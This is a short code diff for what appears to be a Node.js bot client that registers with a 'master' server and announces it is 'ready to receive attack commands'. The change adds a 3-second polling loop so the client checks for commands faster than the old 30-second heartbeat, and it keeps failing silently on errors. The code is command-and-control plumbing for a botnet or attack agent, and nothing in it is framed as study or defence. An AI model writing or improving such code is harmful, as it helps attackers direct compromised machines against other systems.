@@ -75,6 +75,11 @@ async function autoRegister() {
       console.log(`[INFO] Ready to receive attack commands!`);
       console.log(`[INFO] Status: 🟢 ONLINE\n`);
       
+      // Fast command polling - check every 3 seconds for instant response
+      setInterval(() => {
+        checkForCommands();
+      }, 3000);
+      
       // Send heartbeat every 30 seconds to stay connected
       setInterval(() => {
         sendHeartbeat();
@@ -113,9 +118,6 @@ async function sendHeartbeat() {
   try {
     await axios.get(`${MASTER_SERVER}/ping`, { timeout: 5000 });
     console.log(`[HEARTBEAT] 💓 Sent to master | Status: 🟢 ONLINE`);
-    
-    // Also check for pending commands
-    checkForCommands();
   } catch (error) {
     console.log(`[WARN] Heartbeat failed | Status: 🔴 OFFLINE`);
     console.log(`[INFO] Re-registering with master...`);
@@ -145,7 +147,7 @@ async function checkForCommands() {
       }
     }
   } catch (error) {
-    // Silently fail - will retry on next heartbeat
+    // Silently fail - will retry on next poll
   }
 }
 
